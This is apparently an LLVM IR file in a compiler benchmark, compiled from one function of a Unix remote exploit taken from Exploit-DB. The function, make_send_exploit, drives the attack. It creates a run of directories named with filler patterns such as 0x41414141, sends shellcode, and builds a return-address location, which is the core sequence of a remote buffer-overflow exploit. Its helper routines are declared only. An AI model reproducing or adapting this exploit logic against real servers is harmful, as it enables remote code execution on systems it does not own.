; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22974.c_make_send_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22974.c_make_send_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@GET_R = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c" [+] 01: make 0x41414141 directory.\0A\00", align 1
@.str.1 = private unnamed_addr constant [37 x i8] c" [+] 02: make shell-code directory.\0A\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c" [+] 03: make 0x43434343 directory.\0A\00", align 1
@.str.3 = private unnamed_addr constant [37 x i8] c" [+] 04: make 0x44444444 directory.\0A\00", align 1
@.str.4 = private unnamed_addr constant [37 x i8] c" [+] 05: make 0x45454545 directory.\0A\00", align 1
@.str.5 = private unnamed_addr constant [37 x i8] c" [+] 06: make 0x46464646 directory.\0A\00", align 1
@.str.6 = private unnamed_addr constant [37 x i8] c" [+] 07: make 0x47474747 directory.\0A\00", align 1
@.str.7 = private unnamed_addr constant [37 x i8] c" [+] 08: make 0x48484848 directory.\0A\00", align 1
@.str.8 = private unnamed_addr constant [37 x i8] c" [+] 09: make 0x49494949 directory.\0A\00", align 1
@.str.9 = private unnamed_addr constant [37 x i8] c" [+] 10: make 0x50505050 directory.\0A\00", align 1
@.str.10 = private unnamed_addr constant [37 x i8] c" [+] 11: make 0x51515151 directory.\0A\00", align 1
@.str.11 = private unnamed_addr constant [37 x i8] c" [+] 12: make 0x52525252 directory.\0A\00", align 1
@.str.12 = private unnamed_addr constant [37 x i8] c" [+] 13: make 0x53535353 directory.\0A\00", align 1
@.str.13 = private unnamed_addr constant [37 x i8] c" [+] 14: make 0x54545454 directory.\0A\00", align 1
@.str.14 = private unnamed_addr constant [37 x i8] c" [+] 15: make 0x55555555 directory.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @make_send_exploit(i32 %0, i32 %1, i32 %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* @GET_R, align 4
  %12 = zext i32 %11 to i64
  %13 = call i8* @llvm.stacksave()
  store i8* %13, i8** %9, align 8
  %14 = alloca i8, i64 %12, align 16
  store i64 %12, i64* %10, align 8
  %15 = load i32, i32* @stdout, align 4
  %16 = call i32 @fprintf(i32 %15, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %17 = load i32, i32* %5, align 4
  %18 = load i32, i32* %8, align 4
  %19 = call i64 @mkd_cwd_f(i32 %17, i32 %18, i8* %14, i32 65)
  %20 = trunc i64 %19 to i32
  %21 = load i32, i32* @stdout, align 4
  %22 = call i32 @fprintf(i32 %21, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  %23 = load i32, i32* %5, align 4
  %24 = load i32, i32* %8, align 4
  %25 = call i64 @send_shellcode(i32 %23, i32 %24, i8* %14)
  %26 = trunc i64 %25 to i32
  %27 = load i32, i32* @stdout, align 4
  %28 = call i32 @fprintf(i32 %27, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0))
  %29 = load i32, i32* %5, align 4
  %30 = load i32, i32* %8, align 4
  %31 = call i64 @mkd_cwd_f(i32 %29, i32 %30, i8* %14, i32 67)
  %32 = trunc i64 %31 to i32
  %33 = load i32, i32* @stdout, align 4
  %34 = call i32 @fprintf(i32 %33, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.3, i64 0, i64 0))
  %35 = load i32, i32* %5, align 4
  %36 = load i32, i32* %8, align 4
  %37 = call i64 @mkd_cwd_f(i32 %35, i32 %36, i8* %14, i32 68)
  %38 = trunc i64 %37 to i32
  %39 = load i32, i32* @stdout, align 4
  %40 = call i32 @fprintf(i32 %39, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.4, i64 0, i64 0))
  %41 = load i32, i32* %5, align 4
  %42 = load i32, i32* %8, align 4
  %43 = call i64 @mkd_cwd_f(i32 %41, i32 %42, i8* %14, i32 69)
  %44 = trunc i64 %43 to i32
  %45 = load i32, i32* @stdout, align 4
  %46 = call i32 @fprintf(i32 %45, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.5, i64 0, i64 0))
  %47 = load i32, i32* %5, align 4
  %48 = load i32, i32* %8, align 4
  %49 = call i64 @mkd_cwd_f(i32 %47, i32 %48, i8* %14, i32 70)
  %50 = trunc i64 %49 to i32
  %51 = load i32, i32* @stdout, align 4
  %52 = call i32 @fprintf(i32 %51, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.6, i64 0, i64 0))
  %53 = load i32, i32* %5, align 4
  %54 = load i32, i32* %8, align 4
  %55 = call i64 @mkd_cwd_f(i32 %53, i32 %54, i8* %14, i32 71)
  %56 = trunc i64 %55 to i32
  %57 = load i32, i32* @stdout, align 4
  %58 = call i32 @fprintf(i32 %57, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.7, i64 0, i64 0))
  %59 = load i32, i32* %5, align 4
  %60 = load i32, i32* %8, align 4
  %61 = call i64 @mkd_cwd_f(i32 %59, i32 %60, i8* %14, i32 72)
  %62 = trunc i64 %61 to i32
  %63 = load i32, i32* @stdout, align 4
  %64 = call i32 @fprintf(i32 %63, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.8, i64 0, i64 0))
  %65 = load i32, i32* %5, align 4
  %66 = load i32, i32* %8, align 4
  %67 = call i64 @mkd_cwd_f(i32 %65, i32 %66, i8* %14, i32 73)
  %68 = trunc i64 %67 to i32
  %69 = load i32, i32* @stdout, align 4
  %70 = call i32 @fprintf(i32 %69, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.9, i64 0, i64 0))
  %71 = load i32, i32* %5, align 4
  %72 = load i32, i32* %8, align 4
  %73 = call i64 @mkd_cwd_f(i32 %71, i32 %72, i8* %14, i32 80)
  %74 = trunc i64 %73 to i32
  %75 = load i32, i32* @stdout, align 4
  %76 = call i32 @fprintf(i32 %75, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.10, i64 0, i64 0))
  %77 = load i32, i32* %5, align 4
  %78 = load i32, i32* %8, align 4
  %79 = call i64 @mkd_cwd_f(i32 %77, i32 %78, i8* %14, i32 81)
  %80 = trunc i64 %79 to i32
  %81 = load i32, i32* @stdout, align 4
  %82 = call i32 @fprintf(i32 %81, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.11, i64 0, i64 0))
  %83 = load i32, i32* %5, align 4
  %84 = load i32, i32* %8, align 4
  %85 = call i64 @mkd_cwd_f(i32 %83, i32 %84, i8* %14, i32 82)
  %86 = trunc i64 %85 to i32
  %87 = load i32, i32* @stdout, align 4
  %88 = call i32 @fprintf(i32 %87, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.12, i64 0, i64 0))
  %89 = load i32, i32* %5, align 4
  %90 = load i32, i32* %8, align 4
  %91 = call i64 @mkd_cwd_f(i32 %89, i32 %90, i8* %14, i32 83)
  %92 = trunc i64 %91 to i32
  %93 = load i32, i32* @stdout, align 4
  %94 = call i32 @fprintf(i32 %93, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.13, i64 0, i64 0))
  %95 = load i32, i32* %5, align 4
  %96 = load i32, i32* %8, align 4
  %97 = call i64 @mkd_cwd_f(i32 %95, i32 %96, i8* %14, i32 84)
  %98 = trunc i64 %97 to i32
  %99 = load i32, i32* @stdout, align 4
  %100 = call i32 @fprintf(i32 %99, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.14, i64 0, i64 0))
  %101 = load i32, i32* %5, align 4
  %102 = load i32, i32* %8, align 4
  %103 = call i64 @mkd_cwd_f(i32 %101, i32 %102, i8* %14, i32 85)
  %104 = trunc i64 %103 to i32
  %105 = load i32, i32* %5, align 4
  %106 = load i32, i32* %6, align 4
  %107 = load i32, i32* %7, align 4
  %108 = call i64 @make_retloc(i32 %105, i32 %106, i8* %14, i32 %107)
  %109 = trunc i64 %108 to i32
  %110 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %110)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*) #2

declare dso_local i64 @mkd_cwd_f(i32, i32, i8*, i32) #2

declare dso_local i64 @send_shellcode(i32, i32, i8*) #2

declare dso_local i64 @make_retloc(i32, i32, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
